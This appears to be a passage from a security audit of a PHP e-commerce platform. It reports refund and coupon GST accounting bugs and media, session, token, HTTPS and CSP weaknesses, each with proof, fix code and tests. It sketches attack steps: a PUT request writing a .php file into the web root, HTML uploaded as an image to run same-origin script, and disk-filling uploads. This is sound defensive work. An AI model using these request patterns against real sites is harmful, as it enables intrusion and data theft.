*One sub-claim corrected:* on the **return** path, `CommissionLedgerRepository::rowsForSubOrder` filters by `sub_order_id` **and** `whereIn('order_item_id', …)`, so the intersection is empty and `cancelForReturn` returns `skipped` — no unrelated vendor is clawed back; the harm is that the **returning vendor's commission is never cancelled at all**. On the **cancellation** path (`StoreOrderRepository.php:658` initiates with `return_id` null) `$itemIds` stays null and every commission row of the *wrong* sub-order is cancelled/reversed. Both are wrong; the mechanism differs.

**Proof:**
```php
// app/Libraries/Payment/RefundService.php:63-68
->join('sub_orders so', 'so.order_id = o.id', 'left')
->where('p.id', $refund['payment_id'])->orderBy('so.id', 'ASC')   // ← first, not the returned one
```
Concrete: order with a ₹200 case (sub #9001) and a ₹5,000 phone (sub #9002). Customer returns the phone; `returns.sub_order_id = 9002`, `refunds.amount = 5000`. `complete()` picks 9001. factor = min(1, 5000/200) = 1.0. Ledger: debit SALES 169.49, debit GST_PAYABLE 30.51, credit CASH 5000.00 → trial balance out by ₹4,800 on one refund. Credit note issued against the case that was never returned, output GST under-reversed by ~₹733.

**Fix:** Use the sub-order the return actually names; fall back to today's behaviour only when there is no return (whole-order/legacy/POS refunds), so single-product orders are bit-for-bit unchanged.
```php
// payment -> order -> the sub-order this refund actually belongs to.
// A return is raised per sub-order, and one order carries one sub-order PER PRODUCT —
// so the first sub-order of the order is the wrong GST/commission basis.
$subOrderId = null;
if ($refund['return_id'] !== null) {
    $ret = $db->table('returns')->select('sub_order_id')
        ->where('id', (int) $refund['return_id'])->get()->getRowArray();
    $subOrderId = $ret !== null && $ret['sub_order_id'] !== null ? (int) $ret['sub_order_id'] : null;
}

$builder = $db->table('payments p')
    ->select('o.id AS order_id, o.order_no, o.customer_id, so.id AS sub_order_id, so.shop_id,
              so.taxable_value, so.cgst, so.sgst, so.igst, so.grand_total')
    ->join('orders o', 'o.id = p.order_id', 'left')
    ->join('sub_orders so', 'so.order_id = o.id', 'left')
    ->where('p.id', $refund['payment_id']);

if ($subOrderId !== null) { $builder->where('so.id', $subOrderId); }

$row = $builder->orderBy('so.id', 'ASC')->get()->getRowArray();
if ($row === null) { return ['ok' => false, 'reason' => 'no order/sub-order for payment']; }
```
Nothing else changes — `$factor`, `creditNoteTax()`, the ledger entries, the credit note and `cancelForReturn()` all read `$row` and become correct automatically.

**Regression Risk:** Low — for single-sub-order orders and every refund with `return_id` NULL the selected row is identical to today's, so stored amounts do not move. POS returns use `pos_sale_id` (not `sub_order_id`), so `$subOrderId` stays null and the old fallback runs — untouched. One extra indexed SELECT per refund. **Already-processed refunds are not retro-corrected** — existing wrong ledger entries and credit notes need a separate manual reconciliation.

**Testing:** *Works:* single-product order → return → process refund: credit note issued, refund 'completed', `ledger_entries` txn_group balances exactly as before. *Closed:* two-product order of very different value (₹200 / ₹5,000), return only the expensive one, process. Assert `credit_notes.sub_order_id` = the returned sub-order; `taxable_total + cgst + sgst + igst` ≈ that sub-order's values; the three ledger entries for the txn_group sum debit == credit; `admin/ledger/trial-balance` shows `totDebit == totCredit`.

---

#### H11 — Coupon discount is never pushed down to sub-orders: filed GST is over-declared and vendors are over-charged commission

**Severity:** High

**Location:** `app/Models/StoreOrderRepository.php:118-135`; contrast `app/Libraries/Store/CartService.php:199-237`. Consumers: `app/Models/ReportRepository.php:59-62` and `:71-76`.

**Description:** `CartService::totals()` applies the coupon **before** tax: `$factor = max(0.0, 1 - $couponPct/100)` and GST is computed on `$lineAfter = line_total * $factor`. That post-discount tax is stored on the order header (`orders.tax_total`, `discount_total`, `grand_total`).

The sub-order loop then recomputes GST from scratch on the **undiscounted** `$it['line_total']` (which `CartService::resolve` sets as `round($price * $qty, 2)` with no coupon applied), and writes that as `subtotal`, `grand_total` and the commission basis. `sub_orders.discount_total` exists in the schema and is **never written** — `grep -rn 'discount_total' app/` shows the only writers are POS/purchase paths plus `orders.discount_total`. And `grep -rn 'tax_total' app/` returns exactly two hits — one write and one view — so nothing reconciles the two levels.

Consequences on every couponed order:
- `SUM(sub_orders.grand_total) != orders.grand_total`.
- `orders.tax_total` (post-discount) != `SUM(sub_orders.cgst+sgst+igst)` (pre-discount). **The GST return is filed off `sub_orders`** — `ReportRepository::gstSummary()` sums `SUM(cgst), SUM(sgst), SUM(igst)` from that table and renders it at `admin/reports/gst`. Output GST is over-declared by the tax on the discount.
- Vendor commission is charged on the pre-coupon taxable value while the platform collected the post-coupon amount. **The platform funds the discount and still bills the vendor commission on the full price.**

Both surfaces hit it: `CheckoutController.php:436-450` and `CustomerApiController.php:275` both re-validate the coupon server-side and hand the same totals to `place()`.

**Proof:** ₹1,000 line, 18% inclusive, 20% coupon.
`orders`: discount_total 200.00, tax_total 122.03, grand_total 800.00.
`sub_orders`: subtotal 1000.00, grand_total 1000.00, taxable 847.46, cgst 76.27, sgst 76.27 (tax 152.54), commission on 847.46, discount_total 0.00.
`admin/reports/gst` reports ₹152.54 output tax on a sale that grossed ₹800 — **₹30.51 of GST declared and payable on money never received**, and the vendor is charged commission on ₹847.46 instead of ₹677.97.

**Fix:** Allocate the order-level discount pro-rata by line value, then compute GST and commission on the discounted line — the same basis `CartService` already used for the header. Before the item loop:
```php
// The coupon discount is applied BEFORE tax at the cart level (CartService::totals
// scales each line by 1 - pct/100 and taxes the remainder). Sub-orders must use the
// SAME basis or orders.tax_total and SUM(sub_orders.cgst+sgst+igst) disagree, and the
// vendor is charged commission on money the platform never collected. Allocate
// pro-rata; the last line absorbs the rounding remainder so the parts sum back exactly.
$discountTotal = (float) ($totals['discount'] ?? 0);
$lineSum       = array_sum(array_map(static fn ($l) => (float) $l['line_total'], $items));
$discAllocated = 0.0;
```
Inside the loop, replacing `$lineTotal = (float) $it['line_total'];`:
```php
$gross = (float) $it['line_total'];
if ($discountTotal > 0 && $lineSum > 0) {
    $lineDisc = $seq === count($items)
        ? round($discountTotal - $discAllocated, 2)
        : round($discountTotal * $gross / $lineSum, 2);
    $discAllocated += $lineDisc;
} else { $lineDisc = 0.0; }
$lineTotal = max(0.0, round($gross - $lineDisc, 2));
$g = $gst->compute((string) $lineTotal, (float) $it['tax_rate'], true, $interState);
```
In the `sub_orders` insert: keep `'subtotal' => $this->n($gross)`, add `'discount_total' => $this->n($lineDisc)`, set `'grand_total' => $this->n($lineTotal)`. `$comm` automatically receives the discounted `$g['taxable']`.

**Regression Risk:** **High** — this changes stored money on every new couponed order. Sub-order `grand_total`, `taxable_value`, `cgst/sgst/igst` and `commission_amount` all drop; `discount_total` becomes non-zero. Consequences to plan for: (a) `admin/reports/gst` totals **step down** the day it ships and that step must not be read as data loss; (b) vendor settlement amounts **rise** (less commission) for couponed orders, so vendors see a changed statement basis; (c) invoice PDFs generated from `sub_orders` will show the discounted taxable value — verify the template does not also subtract a discount it prints. Orders placed before the change keep their existing (wrong) rows; **do not backfill without an accounting decision**. No-coupon orders are byte-identical.

*If that risk is not acceptable today:* ship the strictly-additive half first — write `'discount_total' => $this->n($lineDisc)` while leaving the GST basis alone. That makes the drift auditable with zero behaviour change and buys time for the accounting decision.

**Testing:** *Works:* place a **no-coupon** two-product order on web and API — every `sub_orders` column identical to a pre-change order, `discount_total` 0.0000. *Closed:* coupon order (20%) with two products of unequal value. Assert (1) `SUM(sub_orders.grand_total) == orders.grand_total`; (2) `SUM(sub_orders.cgst+sgst+igst) == orders.tax_total` to the cent; (3) `SUM(sub_orders.discount_total) == orders.discount_total` **exactly** (the last-line remainder guarantees this); (4) commission computed from the discounted taxable value. Then confirm `admin/reports/gst` for the period matches the sum of `orders.tax_total`.

---

### MEDIUM

*(Full headings retained; prose compressed. All are real defects, none inflated.)*

---

#### M1 — Private media assets are served to any authenticated session, with no owner or tenant check
**Severity:** Medium *(found by two lanes; deduplicated)*
**Location:** `app/Controllers/MediaController.php:31-33`, `MediaController::serve()`; route `app/Config/Routes.php:29` (no filter).
**Description:** The only gate on a `private` asset is `session()->get('isLoggedIn') || session()->get('customer_id')` — no comparison against the asset's own `owner_type`/`owner_id`. Storefront customers self-register by phone OTP in seconds, so the effective ACL is "anyone with a mobile number". The private corpus is rider KYC (`Rider\DocumentController::upload`), vendor KYC (`DocumentUploadController::confirm`), admin-uploaded business files, invoice/credit-note PDFs and report CSVs. `MediaRepository::findByUuid()` does not even select the owner columns. Not enumerable (UUIDv4), which caps severity — but UUIDs are rendered into admin and rider views, sit in access logs, browser history and the DB, so any log disclosure or read-only SQLi becomes "download every rider's Aadhaar". No rate limit, no audit row on the read path.
**Proof:** `if ($asset['visibility'] === 'private' && ! session()->get('isLoggedIn') && ! session()->get('customer_id'))` — that is the entire authorization. Contrast the sibling `DocumentUploadController::ownsKey()`, which *does* scope by prefix.
**Fix:** Add `owner_type`/`owner_id` to the repository SELECT (additive), then gate on them — **ship log-only first**, per the project's rollout convention, because legitimate readers are spread across admin, rider and vendor views:
```php
if ($asset['visibility'] === 'private') {
    if (! session()->get('isLoggedIn') && ! session()->get('customer_id')) { throw …; }
    if (! $this->mayReadPrivate($asset)) {
        $enforcing = filter_var(env('media.enforcePrivateOwner', false), FILTER_VALIDATE_BOOLEAN);
        log_message($enforcing ? 'warning' : 'notice', sprintf(
            'private media access [%s]: user %s (%s) read asset %s owned by %s#%s', …));
        if ($enforcing) { throw PageNotFoundException::forPageNotFound('Media not found'); }
    }
}
```
`mayReadPrivate()`: platform staff with `media.view` → true; `owner_type='rider'` → owner match; `'vendor'` → vendor match; `'shop'` → in the vendor's shop ids; else false. Leave `visibility === 'public'` completely untouched.
**Regression Risk:** Medium — nil in log-only mode. The flip is the risk: unenumerated `owner_type` values (`shop`, `invoice`, `credit_note`, `export`) return false, so a customer opening their own invoice PDF or a `finance` role (which holds `report.export`, not `media.view`) reading an export would break. Run `SELECT owner_type, visibility, COUNT(*) FROM media_assets WHERE status='active' GROUP BY 1,2` first and widen the predicate for every real combination.
**Testing:** *Works (log-only):* admin opens a rider doc, a vendor KYC doc and a report CSV; rider opens their own doc; vendor views a product doc — all render. Logged out, every storefront product image still displays. *Closed (enforcing):* a throwaway customer requesting a rider-document uuid must 404 with a `[BLOCKED]` log line; the owning rider still gets 200.

---

#### M2 — Private media is served with `Cache-Control: public`
**Severity:** Medium
**Location:** `app/Controllers/MediaController.php:47-50`.
**Description:** `serve()` sets `Cache-Control: public, max-age=86400` for **every** asset regardless of visibility — including rider KYC, vendor KYC, invoice PDFs and report exports. `public` explicitly authorises any shared cache (CDN, corporate proxy, kiosk disk cache) to store and replay the body to a different user, bypassing the application check entirely for `max-age` seconds. The root `.htaccess:47` `Header set Cache-Control "no-cache…"` uses `set` not `always` and collides non-deterministically with what CI4 already wrote — it cannot be relied on. This compounds M1: the UUID is the only capability, and `public` multiplies where the body comes to rest. *Unverified:* whether a CDN currently sits in front — if one does, this is worse than Medium.
**Proof:** `$asset['visibility']`, tested at line 31, is never consulted again — a private KYC scan and a public product image get byte-identical cache directives.
**Fix:**
```php
// Public product images should stay CDN-cacheable. Private assets must never be
// stored by a shared cache: a cached body is replayed to the next requester without
// the request ever reaching the session check above.
$cache = $asset['visibility'] === 'private'
    ? 'private, no-store, max-age=0, must-revalidate'
    : 'public, max-age=86400';
```
**Regression Risk:** Low — public assets keep the identical header, so CDN behaviour and storefront page-load are unchanged. Private assets re-fetch from origin per view; given KYC docs are opened rarely by staff, negligible.
**Testing:** `curl -I` a public image uuid → unchanged header, images still served from browser cache. `curl -I` a private uuid → `private, no-store…`; DevTools shows a network request on re-open, not "(from disk cache)".

---

#### M3 — Vendor-uploaded bytes are served inline with their sniffed content type
**Severity:** Medium *(downgraded from High — see below)*
**Location:** `app/Controllers/Vendor/MediaController.php:141-164` (`file`), `:73-90` (`put`), `:104` (`confirm`); identical at `app/Controllers/Vendor/DocumentUploadController.php:128-151`.
**Description:** The presigned-upload flow never inspects the bytes: `presignMedia()` picks the key's extension from the **client-declared** `content_type`, `put()` streams `php://input` to disk with no inspection, `confirm()` re-checks only the same declared type. `file()` then sets Content-Type from `mime_content_type($path)` — the **real** type of the attacker's bytes — with no `Content-Disposition`. HTML bytes are served as `text/html`, same-origin. `nosniff` does not help; the type is genuinely `text/html`. Neither `put()` nor `file()` calls `configured()`, so this works in S3 mode too, not only local.
**Why Medium, not High:** the claimed impact (script running with an admin's privileges) does **not** hold. `PortalController::startStaffImpersonation()` swaps `user_id` **and** `principal_type` to the vendor, so during impersonation the session carries vendor privileges; `Cookie::$httponly = true` blocks cookie theft; the admin panel is a different origin with CORS locked. A real chain survives — admin routes are path-based, so an evil tab on `vendor.shiplore.in` can poll `/admin/*` and start succeeding once the admin clicks "Return to admin" in the same cookie jar — but it needs impersonation of the malicious vendor **plus** a click **plus** the tab surviving `leave()`. Unconditionally, `ownsKey()` confines the prefix to the attacker's own `vendorId`, so the guaranteed victim set is the attacker's own tenant (staff→owner).
**Fix:** Constrain what will render inline. Same block in both controllers:
```php
// The bytes were never inspected on the way in: presign/confirm only ever checked the
// CLIENT-declared content type, so a key ending ".jpg" can hold HTML, and
// mime_content_type() reports that truthfully. Anything a browser could execute in OUR
// origin must not render inline.
$mime = (string) (mime_content_type($path) ?: 'application/octet-stream');
$inline = ['image/jpeg','image/png','image/gif','image/webp','application/pdf',
           'video/mp4','video/webm','video/quicktime','audio/mpeg','audio/wav'];
$res = $this->response->setHeader('Content-Type', $mime)->setHeader('X-Content-Type-Options','nosniff');
if ($mime === 'image/svg+xml') {
    $res->setHeader('Content-Security-Policy', "default-src 'none'; style-src 'unsafe-inline'; sandbox");
} elseif (! in_array($mime, $inline, true)) {
    $res->setHeader('Content-Disposition', 'attachment; filename="' . basename($key) . '"');
}
return $res->setBody((string) file_get_contents($path));
```
**Regression Risk:** Low — allow-listed media types behave identically. Office/text/archive types in `MEDIA_ALLOWED` now arrive as attachments; browsers already download most of those, but a vendor who today previews a `.txt`/`.csv` in-tab now gets a download.
**Testing:** *Works:* upload JPG/PNG/PDF via Media Library and via Documents (KYC), click View on each — same Content-Type, same new-tab behaviour; another vendor's key still 403s. *Closed:* presign as `image/jpeg`, PUT an HTML body, confirm, View → must carry `Content-Disposition: attachment`. SVG with `<script>` → renders as image with the sandbox CSP, no alert.

---

#### M4 — Presigned-PUT endpoints write attacker-named, unvalidated, unbounded bytes inside the DocumentRoot
**Severity:** Medium
**Location:** `app/Libraries/Storage/DocumentStorage.php:283-305` (`saveDummy`), `:337-365` (`safeKey`); reached from `Vendor\MediaController::put()` (`:76-89`) and `Vendor\DocumentUploadController` (`:53-70`).
**Description:** Three missing checks. (1) **No extension constraint** — `safeKey()`'s traversal fix is correct and well reasoned, but it still permits any `[a-zA-Z0-9_\-.]` segment including `shell.php`, and `ownsKey()` only requires the `vendors/{id}/` prefix, never that the key was one the server presigned. (2) **No content validation** — `saveDummy()` streams `php://input` to disk. (3) **No size cap** — `presignMedia()` validates a *client-declared* `size`; `put()` streams the real body with no limit, and `.user.ini` sets `upload_max_filesize`/`post_max_size` to `5000M`. `writable/` is inside the DocumentRoot; the only thing preventing execution is a four-line `writable/.htaccess` that is lost by any rsync without dotfiles and inert under `AllowOverride None`.
**Proof:** `PUT /vendor/media/put?key=vendors/7/x.php` writes `writable/uploads/vendors/7/x.php`. A 2 GB body loop fills the partition, and since `confirm()` is never called the files are invisible to the Media Library UI and to `delete()`.
**Fix:** Constrain the extension centrally in `safeKey()` (one choke point covering both PUT controllers, both `file()` readers and `delete()`) and cap the stream in `saveDummy()`:
```php
/** The only extensions this store will ever write or read back — the union of
 *  ALLOWED and MEDIA_ALLOWED. writable/ lives inside the DocumentRoot; the .htaccess
 *  deny there must not be the only thing standing between a PUT and code execution. */
private const SAFE_EXT = ['pdf','jpg','png','webp','gif','svg','mp4','webm','mov','mp3','wav',
                          'doc','docx','xls','xlsx','ppt','pptx','txt','csv','zip'];
// …at the end of safeKey():
$ext = strtolower(pathinfo($segments[array_key_last($segments)], PATHINFO_EXTENSION));
if (! in_array($ext, self::SAFE_EXT, true)) { throw new \InvalidArgumentException('Invalid storage key.'); }
// …in saveDummy():
$written = stream_copy_to_stream($stream, $out, self::MEDIA_MAX_BYTES + 1);
if ($written === false || $written > self::MEDIA_MAX_BYTES) { @unlink($path); return false; }
```
Keep `writable/.htaccess` as defence in depth.
**Regression Risk:** Low — every key the app generates already ends in an allow-listed extension. `safeKey()` is also on the READ path, so run this first and add any missing extensions before shipping:
```sql
SELECT id, object_key FROM media_assets WHERE bucket <> 'local'
 AND LOWER(SUBSTRING_INDEX(object_key,'.',-1)) NOT IN ('pdf','jpg','png','webp','gif','svg','mp4',
 'webm','mov','mp3','wav','doc','docx','xls','xlsx','ppt','pptx','txt','csv','zip');
```
**Testing:** *Works:* upload PDF via Documents and JPG+MP4 via Media Library through the real dropzone; all appear, open and delete. *Closed:* `PUT …?key=vendors/7/s.php` → 500 `{"ok":false}`, no file, `DocumentStorage write refused unsafe key` logged; `find writable/uploads -name '*.php'` empty. 250 MB body to a valid `.jpg` key → refused, partial removed, oversized message logged.

---

#### M5 — The raw password-reset link, including the live token, is written to the production log
**Severity:** Medium *(found by two lanes; deduplicated)*
**Location:** `app/Controllers/Auth/ForgotPasswordController.php:50`.
**Description:** The reset flow is otherwise well built — 256-bit `random_bytes(32)`, SHA-256 storage, `hash_equals`, 30-minute TTL, single-use. All undone for any reset whose email fails, because the handler logs the complete `?email=…&token=<raw>` link at `error` level, which is inside the production threshold (`Logger.php:42` → 4). Note the asymmetry: the on-screen fallback two lines later **is** gated on `ENVIRONMENT !== 'production'`; the log write is not. The branch fires exactly when SMTP is misconfigured, i.e. potentially for every reset. Not remotely readable (`writable/.htaccess`), but logs are read by support, swept into backups (`writable/` is 138 MB with no retention policy) and shipped to aggregators far more freely than a password database.
**Proof:** `log_message('error', 'Password reset link for {email}: {link}', ['email'=>$email,'link'=>$link]);` where `$link` was built four lines earlier with `'&token=' . $pair['token']`.
**Fix:** Keep the diagnostic, drop the credential:
```php
// NEVER log $link: it carries the raw single-use token, and this line is retained in
// production (logger.threshold = 4). The hash prefix is enough to correlate this line
// with the auth_otp row.
log_message('error', 'Password reset token issued for {email} (hash {ref}) but not delivered.',
    ['email' => $email, 'ref' => substr($pair['hash'], 0, 12)]);
```
The dev-only flashdata on the next line already gives non-production the usable link.
**Regression Risk:** Low — no control flow, message, redirect or stored row changes. The only lost capability is an operator completing a stranded reset by copying the link out of the log, which is the capability being removed. **Rotate or purge `writable/logs/` after deploying** — historical files still contain live-until-expiry tokens.
**Testing:** *Works:* break SMTP in non-production, request a reset — same user message, two error lines, `reset_link` flashdata still present, full flow completes once SMTP is restored. *Closed:* with `CI_ENVIRONMENT=production` and broken SMTP, `grep -c 'token=' writable/logs/log-$(date +%F).log` → 0, and one line naming the email and hash prefix.

---

#### M6 — Password change or reset invalidates nothing: no session eviction, no JWT revocation mechanism at all
**Severity:** Medium
**Location:** `app/Controllers/Auth/ForgotPasswordController.php:112-114`; `Admin\ProfileController.php:69`; `Vendor\MeController.php:70`; `app/Libraries/TokenService.php:50-74`; `app/Filters/JwtAuthFilter.php:22-59`.
**Description:** "Change your password" is the universal response to suspected compromise, and here it evicts nobody. `doReset()` destroys the session of whoever holds the reset link, not the victim's other sessions (and FileHandler storage cannot enumerate them anyway). The two self-service change endpoints do not even rotate the caller's own session ID. On the API it is worse: tokens carry `sub`/`typ`/`name`/`iat`/`exp` with **no `jti`**, `verify()` checks only signature and `exp`, `JwtAuthFilter` consults only `isActive()`, and `POST /api/v1/auth/refresh` trades any still-valid token for a fresh 30-day one — so a stolen token grants access indefinitely by refreshing monthly. The only working lever is suspending the whole account, which takes the legitimate owner offline too.
**Fix:** Bind tokens to the password without a new table or response change. `users.updated_at` already moves on `updatePassword()` (`ON UPDATE CURRENT_TIMESTAMP`), but a hash prefix is more direct:
1. Stamp `'pwd' => substr(hash('sha256', (string) $user['password_hash']), 0, 16)` into the claims in `AuthApiController::session()` and the two `VendorPosController` mint sites.
2. In `JwtAuthFilter`, after `isActive()`: if the `pwd` claim is present and does not match the current hash, return 401. **Nullable-tolerant on purpose** — tokens already in the wild carry no claim and keep working until they expire, so no shipped app is logged out by the deploy.
3. `session()->regenerate(true)` after both self-service password changes.
Step 1 without step 2 is a no-op, so they can ship across two releases.
**Regression Risk:** Medium — once tokens carry the claim, a password change **does** sign the user out of the mobile app. That is intended but user-visible; put it in release notes. One extra PK lookup per API request (mergeable with `isActive()` later).
**Testing:** *Works:* obtain tokens from all four mint paths, call an authenticated endpoint with each, refresh and confirm the new token works. **Keep a pre-change token and confirm it still authenticates** — that is the backward-compat guard. *Closed:* obtain a token, change the password on the web, reuse the token → 401; refresh with it → fails; a fresh login works.

---

#### M7 — Customer OTP sign-in does not regenerate the session ID; store and rider logout leave the session ID valid
**Severity:** Medium
**Location:** `app/Controllers/Store/AccountController.php:150-182` (`verify`), `:194-199` (`logout`); `app/Controllers/Rider/AuthController.php:125-130` (`logout`).
**Description:** Every other sign-in path rotates before elevating — `LoginController::attempt` (`:98`), `::otpLogin` (`:158`), `AccountController::otpLogin` (`:69`), `Rider\AuthController::otpLogin`/`signIn` (`:103`,`:119`). `AccountController::verify()` — the phone-code and email-code paths — does not: it writes `customer_id` into whatever session ID the browser presented. Textbook fixation, and the `.shiplore.in` cookie domain makes it reachable: cookies are not origin-scoped, so anything executing on **any** sibling subdomain can set `ci_session` for the parent domain. Separately both logouts only `session()->remove([...])` the identity keys — the ID itself is never retired, so a captured ID is re-usable after the next sign-in.
**Fix:** Add `session()->regenerate();` before the `session()->set([...])` in **both** branches of `verify()` (the Firebase path in the same class already does this). For both logouts use `session()->regenerate(true);` after the `remove()` — this destroys the old file while preserving guest bookkeeping (`my_orders`, set by `BaseStoreController::rememberOrder()`).
**Regression Risk:** Low — `regenerate()` moves the payload, so `login_return` and `my_orders` survive and the sign-in-then-continue-to-checkout flow is unaffected. The identical call is already live on the Firebase path in the same controller.
**Testing:** *Works:* sign in by phone OTP and email OTP; an interrupted checkout resumes at the saved `login_return`; a guest order stays viewable. *Closed:* note `ci_session` before submitting the OTP — it must change. Copy a signed-in `ci_session` to a second browser, sign out in the first, reload the second → signed-out storefront.

---

#### M8 — Session ID rotation leaves the previous authenticated session file valid; logout destroys only the current ID
**Severity:** Medium
**Location:** `app/Config/Session.php:82` (`$timeToUpdate = 300`), `:93` (`$regenerateDestroy = false`); `app/Controllers/Auth/LoginController.php:98`, `:173-178`.
**Description:** CI4 auto-rotates every 300s via `regenerate($this->config->regenerateDestroy)`. With `false` that is `session_regenerate_id(false)` — a new ID, with the previous file left on disk still holding the authenticated payload and still accepted until GC. A two-hour admin session leaves ~24 independently valid IDs; `logout()` destroys exactly one. A cookie captured at any point cannot be revoked by signing out — and signing out is what a user does when they think they have been exposed.
**Fix:** Two separable steps. (1) **Low risk, do first:** `session()->regenerate(true)` at both `LoginController` sign-in points and the equivalents in `Store\AccountController::otpLogin` and `Rider\AuthController` — the pre-login session holds only flashdata and CSRF state, both carried across. (2) **The actual fix:** `public bool $regenerateDestroy = true;` in `app/Config/Session.php`.
**Regression Risk:** Step 1 Low. **Step 2 Medium and concrete:** a request already in flight when the ID rotates finds its file gone and is treated as signed out. This app fires background AJAX against authenticated routes (the vendor order-detail heartbeat and rider location ping are named in `app/Config/Security.php:74-79`), so a rotation racing one can produce a spurious logout or 403 — intermittent and hard to reproduce. Stage it and watch for unexpected `login` redirects; if they appear, prefer raising `$timeToUpdate` over reverting. Neither change shortens the window for a cookie captured within the current 300s slice — only server-side invalidation (a move to DatabaseHandler) would.
**Testing:** *Works:* keep tabs open past the 5-minute boundary on admin, vendor and rider (watch the cookie change) — nothing logs out; the order-detail heartbeat keeps returning 200; a form submitted immediately after rotation gets no CSRF 403. *Closed:* record a cookie, wait past 300s, sign out, replay the recorded value in a second browser → login page. `writable/session/` no longer accumulates multiple files per active login.

---

#### M9 — No HTTP→HTTPS redirect and no HSTS anywhere in the stack
**Severity:** Medium *(found by two lanes; deduplicated)*
**Location:** `app/Config/App.php:172` (`$forceGlobalSecureRequests = false`); `.htaccess:1-5`, `:79-96`; `public/.htaccess:24-27`.
**Description:** `Strict-Transport-Security` is emitted nowhere. The `forcehttps` filter is registered in `Filters::$required['before']` but is a no-op while the flag is false. Neither `.htaccess` compensates — the root file has no `RewriteCond %{HTTPS}` at all, and `public/.htaccess`'s only scheme-aware rule redirects **to `http://`**. So `http://admin.shiplore.in/login` is served over plaintext and its form posts to a plaintext URL. The failure is quiet: the password crosses in the clear, then the `Secure` cookie is refused by the browser, so the user just sees the login form again and retries.
**Fix:** Set HSTS and the redirect at the Apache layer, in **both** files so they survive the planned DocumentRoot move:
```apache
# HTTPS only. Deliberately WITHOUT includeSubDomains and WITHOUT preload: subdomains
# are not audited for certificate coverage here, and preload is irreversible.
# Raise to 31536000 once a full traffic day shows no plaintext fallback.
Header always set Strict-Transport-Security "max-age=2592000"
```
```apache
RewriteCond %{HTTPS} !=on
RewriteCond %{HTTP:X-Forwarded-Proto} !https
RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]
```
and fix `public/.htaccess:26` to redirect to `https://`. **Do not** set `forceGlobalSecureRequests = true` instead: `App::$proxyIPs` is `[]`, so if TLS terminates on a proxy forwarding over http, CI4 sees every request as insecure and redirect-loops the whole site.
**Regression Risk:** Medium — HSTS is not revocable within max-age, hence 30 days not a year. Before shipping: confirm every hostname in `$allowedHostnames` has a valid, auto-renewing certificate; verify what the front end actually sends (Cloudflare Flexible SSL would loop the rule as written); exclude `.well-known` if your ACME client uses http-01. Test one hostname first.
**Testing:** *Works:* storefront, admin, vendor, rider, monline and an `api/v1` endpoint all respond normally over https with no loop; check the Apache log per hostname. *Closed:* `curl -sI https://shiplore.in/ | grep -i strict-transport` shows the header; `curl -sI http://admin.shiplore.in/login` returns 301 to https; `curl -sI http://www.shiplore.in/` now redirects to **https**, not http.

---

#### M10 — CSP is emitted report-only with no reporting endpoint — it neither blocks nor collects
**Severity:** Medium
**Location:** `app/Config/ContentSecurityPolicy.php:41` (`$reportOnly = true`), `:47` (`$reportURI = null`); `app/Config/App.php:219` (`$CSPEnabled = true`).
**Description:** A policy is built and emitted on every response as `Content-Security-Policy-Report-Only`, which browsers never enforce, with no `report-uri`/`report-to`, so violations go to a console nobody watches. Zero protection **and** zero telemetry. The file states an explicit rollout plan ("collect the violations from a real traffic day, build the script allow-list, then flip") that **cannot progress** because the telemetry does not exist. This is the layer that would have blunted H5.
**Fix:** Give it somewhere to report. `$reportURI = '/csp-report';`, one route (`$routes->post('csp-report', 'CspReportController::collect');`), and a ~25-line controller that decodes `csp-report`, caps the body at 8192 bytes, writes one `notice` line (`violated-directive`, `blocked-uri`, `document-uri`, each truncated) and returns 204. Then follow the plan: read a traffic day, add `{csp-script-nonce}` to the inline blocks it names (`autoNonce` is already on), and only then set `$reportOnly = false`.
**Regression Risk:** Low — adding `report-uri` to a non-enforcing header changes nothing a user sees. Two cautions: it is a public unauthenticated POST and browser extensions generate violations on every page load, so watch log growth for the first day (consider a `throttle` filter); and **do not pair it with flipping `$reportOnly`** in the same change — the admin views rely on inline `<script>` and inline handlers, and an enforcing policy without nonces breaks the panel instantly. One phase per commit.
**Testing:** *Works:* admin, storefront and monline render identically; `curl -sI` shows `Content-Security-Policy-Report-Only` (not the enforcing name) now including `report-uri /csp-report`. *Closed:* open the admin portal and confirm `csp-violation:` lines naming the inline scripts — that corpus is the deliverable. `curl -X POST … -d '{"csp-report":{…}}'` returns 204 and writes one line; garbage or a 1 MB body returns 204 and writes nothing.

---

#### M11 — `VendorAccountRepository` omits the `party_type` predicate, so a manufacturer resolves as a vendor tenant
**Severity:** Medium *(downgraded from High)*
**Location:** `app/Models/VendorAccountRepository.php:18-27` (`findByOwnerUserId`), `:36` (`findStaffVendor`); contrast `app/Models/ManufacturerAccountRepository.php:29-41`.
**Description:** Manufacturers and vendors share the `vendors` table, distinguished by `party_type`. `ManufacturerAccountRepository` constrains every lookup with `->where('party_type', self::PARTY_TYPE)` and its docblock says that constraint exists to stop the panels resolving each other's tenants "and vice versa". `VendorAccountRepository` has no such constraint, so the guard is one-directional: a manufacturer owner reaching `/vendor/*` gets their own `vendors` row back, `requireVendor()` passes, and the `webAuth:vendor` pin is log-only (H4). Only 8 of 31 vendor controllers call `can()`; the other 23 gate on `requireVendor()` alone.
**Why Medium, not High:** the headline consequence — creating storefront products under a manufacturer — **does not work as stated**. `Vendor\ProductController::store()` requires `resolveShopIds()` to return a posted shop id that is in `allowedShopIds()`, which reads the `shops` table; `ManufacturerRegistrationRepository` inserts the first unit into **`mshops`**, not `shops`, so a manufacturer owns zero `shops` rows and product creation fails outright. Most of the rest of the vendor surface is shop- or sub_order-driven and returns empty. An escalation still exists but needs an extra step nobody identified: `Vendor\ShopController::create()` passes for a manufacturer and writes a real `shops` row under their own vendor id, after which the product path opens — and even then storefront visibility is approval-gated. Crucially, **every vendor-panel query is scoped to the manufacturer's own `vendors.id`** — there is no cross-tenant read or write at any point, so the "scoping bypass = Critical" rule does not apply. What is breached is the tenant-*type* boundary and the B2B-only business rule (`ManufacturerProductRepository` forces `is_online_enabled=0`, `visibility='vendor'`), by a party that already passed admin approval.
**Fix:** Add the mirror predicate so the constraint is symmetric:
```php
/** Vendors and manufacturers share the `vendors` table. Without this constraint a
 *  manufacturer owner reaching /vendor/* resolves a real tenant and is let in — the
 *  mirror of the gate ManufacturerAccountRepository already applies. */
private const PARTY_TYPE = 'vendor';
// …->where('party_type', self::PARTY_TYPE) in findByOwnerUserId() and on `v.` in findStaffVendor()
```
This fixes every caller at once (`BaseVendorController`, `VendorApiController::vendorId()/shopScope()/isOwner()`, `BaseMonlineController::buyer()`, `SyncController::callerVendorIds()`).
